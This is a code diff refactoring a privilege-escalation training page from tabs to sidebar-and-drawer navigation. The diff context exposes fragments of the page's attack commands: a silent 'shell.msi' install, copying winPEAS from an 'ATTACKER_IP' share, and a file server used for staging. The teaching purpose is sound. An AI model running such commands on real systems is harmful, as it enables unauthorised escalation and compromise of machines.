@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import LearnPageLayout from "../components/LearnPageLayout";
 import QuizSection, { QuizQuestion } from "../components/QuizSection";
 import {
@@ -6,8 +6,6 @@ import {
   Container,
   Typography,
   Paper,
-  Tabs,
-  Tab,
   Chip,
   Button,
   Table,
@@ -35,6 +33,11 @@ import {
   Step,
   StepLabel,
   StepContent,
+  useTheme,
+  useMediaQuery,
+  Drawer,
+  Fab,
+  LinearProgress,
 } from "@mui/material";
 import ArrowBackIcon from "@mui/icons-material/ArrowBack";
 import ContentCopyIcon from "@mui/icons-material/ContentCopy";
@@ -62,22 +65,23 @@ import MemoryIcon from "@mui/icons-material/Memory";
 import DataObjectIcon from "@mui/icons-material/DataObject";
 import VpnKeyIcon from "@mui/icons-material/VpnKey";
 import PlayArrowIcon from "@mui/icons-material/PlayArrow";
+import ListAltIcon from "@mui/icons-material/ListAlt";
+import CloseIcon from "@mui/icons-material/Close";
+import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
 import { Link, useNavigate } from "react-router-dom";
 
-interface TabPanelProps {
-  children?: React.ReactNode;
-  index: number;
-  value: number;
-}
-
-function TabPanel(props: TabPanelProps) {
-  const { children, value, index, ...other } = props;
-  return (
-    <div role="tabpanel" hidden={value !== index} {...other}>
-      {value === index && <Box sx={{ py: 3 }}>{children}</Box>}
-    </div>
-  );
-}
+// Section Navigation Items
+const sectionNavItems = [
+  { id: "intro", label: "Introduction", icon: <AdminPanelSettingsIcon /> },
+  { id: "overview", label: "Overview", icon: <TipsAndUpdatesIcon /> },
+  { id: "linux-privesc", label: "Linux Privesc", icon: <TerminalIcon /> },
+  { id: "windows-privesc", label: "Windows Privesc", icon: <ComputerIcon /> },
+  { id: "enumeration", label: "Enumeration", icon: <SecurityIcon /> },
+  { id: "kernel-exploits", label: "Kernel Exploits", icon: <BugReportIcon /> },
+  { id: "tools", label: "Tools", icon: <BuildIcon /> },
+  { id: "resources", label: "Resources", icon: <SchoolIcon /> },
+  { id: "quiz-section", label: "Knowledge Check", icon: <QuizIcon /> },
+];
 
 interface CodeBlockProps {
   title: string;
@@ -111,6 +115,7 @@ function CodeBlock({ title, code, language = "bash" }: CodeBlockProps) {
 
 const QUIZ_QUESTION_COUNT = 10;
 const QUIZ_ACCENT_COLOR = "#f59e0b";
+const ACCENT_COLOR = "#ef4444";
 
 const quizQuestions: QuizQuestion[] = [
   {
@@ -1091,12 +1096,106 @@ const quizQuestions: QuizQuestion[] = [
 ];
 
 export default function PrivilegeEscalationGuidePage() {
+  const theme = useTheme();
   const navigate = useNavigate();
-  const [tabValue, setTabValue] = useState(0);
+  const isMobile = useMediaQuery(theme.breakpoints.down("md"));
+  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
+  const [activeSection, setActiveSection] = useState("intro");
 
-  const handleTabChange = (_event: React.SyntheticEvent, newValue: number) => {
-    setTabValue(newValue);
+  const scrollToSection = (id: string) => {
+    const el = document.getElementById(id);
+    if (el) {
+      el.scrollIntoView({ behavior: "smooth", block: "start" });
+      setActiveSection(id);
+      setNavDrawerOpen(false);
+    }
   };
+
+  useEffect(() => {
+    const handleScroll = () => {
+      const sections = sectionNavItems.map((s) => s.id);
+      for (const id of sections) {
+        const el = document.getElementById(id);
+        if (el) {
+          const rect = el.getBoundingClientRect();
+          if (rect.top <= 150 && rect.bottom > 150) {
+            setActiveSection(id);
+            break;
+          }
+        }
+      }
+    };
+    window.addEventListener("scroll", handleScroll, { passive: true });
+    return () => window.removeEventListener("scroll", handleScroll);
+  }, []);
+
+  // Sidebar navigation component
+  const sidebarNav = (
+    <Paper
+      sx={{
+        p: 2,
+        position: "sticky",
+        top: 80,
+        maxHeight: "calc(100vh - 100px)",
+        overflowY: "auto",
+        bgcolor: "#12121a",
+        border: `1px solid ${alpha(ACCENT_COLOR, 0.2)}`,
+        borderRadius: 2,
+      }}
+    >
+      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: ACCENT_COLOR, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+        <ListAltIcon fontSize="small" />
+        Contents
+      </Typography>
+      <Box sx={{ mb: 2 }}>
+        <LinearProgress
+          variant="determinate"
+          value={((sectionNavItems.findIndex((s) => s.id === activeSection) + 1) / sectionNavItems.length) * 100}
+          sx={{
+            height: 4,
+            borderRadius: 2,
+            bgcolor: alpha(ACCENT_COLOR, 0.1),
+            "& .MuiLinearProgress-bar": { bgcolor: ACCENT_COLOR },
+          }}
+        />
+        <Typography variant="caption" sx={{ color: "grey.500", mt: 0.5, display: "block" }}>
+          {sectionNavItems.findIndex((s) => s.id === activeSection) + 1} / {sectionNavItems.length} sections
+        </Typography>
+      </Box>
+      <List dense disablePadding>
+        {sectionNavItems.map((item) => (
+          <ListItem
+            key={item.id}
+            component="button"
+            onClick={() => scrollToSection(item.id)}
+            sx={{
+              borderRadius: 1,
+              mb: 0.5,
+              bgcolor: activeSection === item.id ? alpha(ACCENT_COLOR, 0.15) : "transparent",
+              borderLeft: activeSection === item.id ? `3px solid ${ACCENT_COLOR}` : "3px solid transparent",
+              cursor: "pointer",
+              border: "none",
+              width: "100%",
+              textAlign: "left",
+              "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.08) },
+            }}
+          >
+            <ListItemIcon sx={{ minWidth: 32, color: activeSection === item.id ? ACCENT_COLOR : "grey.500" }}>
+              {item.icon}
+            </ListItemIcon>
+            <ListItemText
+              primary={item.label}
+              primaryTypographyProps={{
+                variant: "body2",
+                fontWeight: activeSection === item.id ? 600 : 400,
+                color: activeSection === item.id ? "#e0e0e0" : "grey.400",
+              }}
+            />
+          </ListItem>
+        ))}
+      </List>
+    </Paper>
+  );
 
   // Linux privesc techniques with detailed exploitation steps
   const linuxTechniques = [
@@ -1414,9 +1513,20 @@ export default function PrivilegeEscalationGuidePage() {
 
   return (
     <LearnPageLayout pageTitle="Privilege Escalation Guide" pageContext={pageContext}>
-    <Container maxWidth="xl" sx={{ py: 4 }}>
+    <Box sx={{ minHeight: "100vh", bgcolor: "#0a0a0f", py: 4 }}>
+      <Container maxWidth="xl">
+        <Grid container spacing={3}>
+          {/* Sidebar Navigation - Desktop */}
+          {!isMobile && (
+            <Grid item md={2.5} sx={{ display: { xs: "none", md: "block" } }}>
+              {sidebarNav}
+            </Grid>
+          )}
+
+          {/* Main Content */}
+          <Grid item xs={12} md={9.5}>
       {/* Header */}
-      <Box sx={{ mb: 4 }}>
+      <Box id="intro" sx={{ mb: 4, scrollMarginTop: 80 }}>
         <Chip
           component={Link}
           to="/learn"
@@ -1452,31 +1562,8 @@ export default function PrivilegeEscalationGuidePage() {
         </Typography>
       </Alert>
 
-      {/* Tabs */}
-      <Paper sx={{ bgcolor: "#111118", borderRadius: 2, mb: 3 }}>
-        <Tabs
-          value={tabValue}
-          onChange={handleTabChange}
-          variant="scrollable"
-          scrollButtons="auto"
-          sx={{
-            "& .MuiTab-root": { color: "grey.500", textTransform: "none", fontWeight: 600 },
-            "& .Mui-selected": { color: "#ef4444" },
-            "& .MuiTabs-indicator": { bgcolor: "#ef4444" },
-          }}
-        >
-          <Tab label="Overview" icon={<TipsAndUpdatesIcon />} iconPosition="start" />
-          <Tab label="Linux Privesc" icon={<TerminalIcon />} iconPosition="start" />
-          <Tab label="Windows Privesc" icon={<ComputerIcon />} iconPosition="start" />
-          <Tab label="Enumeration" icon={<SecurityIcon />} iconPosition="start" />
-          <Tab label="Kernel Exploits" icon={<BugReportIcon />} iconPosition="start" />
-          <Tab label="Tools" icon={<BuildIcon />} iconPosition="start" />
-          <Tab label="Resources" icon={<SchoolIcon />} iconPosition="start" />
-        </Tabs>
-      </Paper>
-
-      {/* Tab 0: Overview */}
-      <TabPanel value={tabValue} index={0}>
+      {/* Section: Overview */}
+      <Box id="overview" sx={{ scrollMarginTop: 80 }}>
         <Grid container spacing={3}>
           <Grid item xs={12}>
             <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
@@ -1650,14 +1737,15 @@ export default function PrivilegeEscalationGuidePage() {
             </Paper>
           </Grid>
         </Grid>
-      </TabPanel>
+      </Box>
 
-      {/* Tab 1: Linux Privesc */}
-      <TabPanel value={tabValue} index={1}>
+      {/* Section: Linux Privesc */}
+      <Box id="linux-privesc" sx={{ mt: 4, scrollMarginTop: 80 }}>
         <Grid container spacing={3}>
           <Grid item xs={12}>
             <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
-              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
+              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700, display: "flex", alignItems: "center", gap: 2 }}>
+                <TerminalIcon />
                 Linux Privilege Escalation Techniques
               </Typography>
               <Typography variant="body2" sx={{ color: "grey.400", mb: 3 }}>
@@ -1866,14 +1954,15 @@ find / -name "*.db" -o -name "*.sqlite" 2>/dev/null`}
             </Alert>
           </Grid>
         </Grid>
-      </TabPanel>
+      </Box>
 
-      {/* Tab 2: Windows Privesc */}
-      <TabPanel value={tabValue} index={2}>
+      {/* Section: Windows Privesc */}
+      <Box id="windows-privesc" sx={{ mt: 4, scrollMarginTop: 80 }}>
         <Grid container spacing={3}>
           <Grid item xs={12}>
             <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
-              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
+              <Typography variant="h5" sx={{ color: "#3b82f6", mb: 2, fontWeight: 700, display: "flex", alignItems: "center", gap: 2 }}>
+                <ComputerIcon />
                 Windows Privilege Escalation Techniques
               </Typography>
               <Typography variant="body2" sx={{ color: "grey.400", mb: 3 }}>
@@ -2106,14 +2195,15 @@ msiexec /quiet /qn /i C:\\path\\to\\shell.msi`}
             </Alert>
           </Grid>
         </Grid>
-      </TabPanel>
+      </Box>
 
-      {/* Tab 3: Enumeration */}
-      <TabPanel value={tabValue} index={3}>
+      {/* Section: Enumeration */}
+      <Box id="enumeration" sx={{ mt: 4, scrollMarginTop: 80 }}>
         <Grid container spacing={3}>
           <Grid item xs={12}>
             <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
-              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
+              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700, display: "flex", alignItems: "center", gap: 2 }}>
+                <SecurityIcon />
                 Enumeration Methodology
               </Typography>
               <Typography variant="body2" sx={{ color: "grey.400", mb: 3 }}>
@@ -2337,14 +2427,15 @@ Seatbelt.exe -group=misc`}
             </Paper>
           </Grid>
         </Grid>
-      </TabPanel>
+      </Box>
 
-      {/* Tab 4: Kernel Exploits */}
-      <TabPanel value={tabValue} index={4}>
+      {/* Section: Kernel Exploits */}
+      <Box id="kernel-exploits" sx={{ mt: 4, scrollMarginTop: 80 }}>
         <Grid container spacing={3}>
           <Grid item xs={12}>
             <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
-              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
+              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700, display: "flex", alignItems: "center", gap: 2 }}>
+                <BugReportIcon />
                 Kernel Exploits
               </Typography>
               <Typography variant="body2" sx={{ color: "grey.400", mb: 3 }}>
@@ -2572,14 +2663,15 @@ python3 -m http.server 80`}
             </Alert>
           </Grid>
         </Grid>
-      </TabPanel>
+      </Box>
 
-      {/* Tab 5: Tools */}
-      <TabPanel value={tabValue} index={5}>
+      {/* Section: Tools */}
+      <Box id="tools" sx={{ mt: 4, scrollMarginTop: 80 }}>
         <Grid container spacing={3}>
           <Grid item xs={12}>
             <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
-              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
+              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700, display: "flex", alignItems: "center", gap: 2 }}>
+                <BuildIcon />
                 Essential Privilege Escalation Tools
               </Typography>
               <Typography variant="body2" sx={{ color: "grey.400", mb: 3 }}>
@@ -2768,14 +2860,15 @@ copy \\\\ATTACKER_IP\\share\\winpeas.exe .`}
             </Paper>
           </Grid>
         </Grid>
-      </TabPanel>
+      </Box>
 
-      {/* Tab 6: Resources */}
-      <TabPanel value={tabValue} index={6}>
+      {/* Section: Resources */}
+      <Box id="resources" sx={{ mt: 4, scrollMarginTop: 80 }}>
         <Grid container spacing={3}>
           <Grid item xs={12} md={6}>
             <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
-              <Typography variant="h6" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
+              <Typography variant="h6" sx={{ color: "#ef4444", mb: 2, fontWeight: 700, display: "flex", alignItems: "center", gap: 2 }}>
+                <SchoolIcon />
                 📚 Essential Documentation
               </Typography>
               <List>
@@ -2927,7 +3020,9 @@ copy \\\\ATTACKER_IP\\share\\winpeas.exe .`}
             </Alert>
           </Grid>
         </Grid>
-      </TabPanel>
+      </Box>
+
+      {/* Section: Quiz */}
       <Paper
         id="quiz-section"
         sx={{
@@ -2935,6 +3030,7 @@ copy \\\\ATTACKER_IP\\share\\winpeas.exe .`}
           p: 4,
           borderRadius: 3,
           border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`,
+          scrollMarginTop: 80,
         }}
       >
         <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
@@ -2961,7 +3057,71 @@ copy \\\\ATTACKER_IP\\share\\winpeas.exe .`}
           Back to Learning Hub
         </Button>
       </Box>
-    </Container>
+          </Grid>
+        </Grid>
+      </Container>
+    </Box>
+
+        {/* Mobile Drawer */}
+        <Drawer
+          anchor="left"
+          open={navDrawerOpen}
+          onClose={() => setNavDrawerOpen(false)}
+          sx={{
+            display: { xs: "block", md: "none" },
+            "& .MuiDrawer-paper": {
+              width: 280,
+              bgcolor: "#0a0a0f",
+              borderRight: `1px solid ${alpha(ACCENT_COLOR, 0.2)}`,
+            },
+          }}
+        >
+          <Box sx={{ p: 2 }}>
+            <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 2 }}>
+              <Typography variant="h6" sx={{ fontWeight: 700, color: ACCENT_COLOR }}>
+                Navigation
+              </Typography>
+              <IconButton onClick={() => setNavDrawerOpen(false)} sx={{ color: "grey.400" }}>
+                <CloseIcon />
+              </IconButton>
+            </Box>
+            {sidebarNav}
+          </Box>
+        </Drawer>
+
+        {/* Mobile FABs */}
+        {isMobile && (
+          <>
+            <Fab
+              size="small"
+              onClick={() => setNavDrawerOpen(true)}
+              sx={{
+                position: "fixed",
+                bottom: 80,
+                right: 16,
+                bgcolor: alpha(ACCENT_COLOR, 0.2),
+                color: ACCENT_COLOR,
+                "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.3) },
+              }}
+            >
+              <ListAltIcon />
+            </Fab>
+            <Fab
+              size="small"
+              onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
+              sx={{
+                position: "fixed",
+                bottom: 16,
+                right: 16,
+                bgcolor: alpha(ACCENT_COLOR, 0.2),
+                color: ACCENT_COLOR,
+                "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.3) },
+              }}
+            >
+              <KeyboardArrowUpIcon />
+            </Fab>
+          </>
+        )}
     </LearnPageLayout>
   );
 }
